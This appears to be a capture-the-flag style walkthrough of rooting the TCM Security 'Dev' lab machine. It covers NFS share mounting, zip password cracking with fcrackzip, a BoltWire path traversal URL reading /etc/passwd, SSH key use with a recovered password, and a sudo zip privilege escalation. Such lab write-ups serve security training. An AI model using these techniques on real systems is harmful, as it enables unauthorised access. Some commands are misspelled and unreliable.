# Exploitation

2049/tcp  open  nfs      3-4 (RPC #100003): we have this port open which we can try connecting to : 

to connect to this we will use this commands; 

1. `apt install nfs-common`

2. `sytstmectl start rcpbind`

3. `showmount -e <target ip>`

4. `mount <server ip>:/srv/nfs /home/kali/Downloads/nfs` 

5. `df -h`
   

through this we found one zip file pass protected ; 

to crack the password we used a tool called fcrackzip

we cracked it through the following command: 

1. `apt installl fcrackzip` 
2. `fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt <name of the zip >`
   
unziping it gve us two files:
1. a todo.txt
2. #### id_rsa file :
that contains the private key of an SSH key pair. SSH keys are used to authenticate a client to an SSH server securely. The key pair consists of a public key and a private key. The private key, stored in the **id_rsa** file, should be kept secret and secure, while the public key can be shared freely.

we used it to connect to ssh of user , root but didnt work as it was still asking for a password and we didnt have that: 
the cmd we used to connect : 
ssh -i id_rsa user@192.168.171.130
so we checked for the boltwire exploit we got this :
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/6.png?raw=true "Employee Data title")

doing this does not work: http://192.168.171.130/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
so instead we tried it on port 8080 one which already had half of it in the url so we just added more then we got the results 
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/7.png?raw=true "Employee Data title")
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/8.png?raw=true "Employee Data title")
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/9.png?raw=true "Employee Data title")

we also have jp we found in the todo.txt in the zip file we cn use his username  to connect to the ssh using the id_rsa file provided in the zip file : 

![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/10.png?raw=true "Employee Data title")

it was saying pkfile is not safe so we changed user permissions and then tried connecting to it : 
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/11.png?raw=true "Employee Data title")

the password was I_love_java we found in the config file on the target website.
then use history  to know for history 
and using sudo -l for knowing what elvated privileges uyou may use without a password 

![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/12.png?raw=true "Employee Data title")

so we got one of them bing zip so we are going to abuse it by 

1. go to gtfobins on a browser

2. open first link 

3. click on sudo 

4. search for zip then clickk on zip and execute each command one by one which gives root privilege.
5. 
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/13.png?raw=true "Employee Data title")
![Employee data](https://github.com/Khushiiipanwar/Solving-Dev-Machine-by-TCM-Security-/blob/main/images/14.png?raw=true "Employee Data title")

## finally rooting the box. 







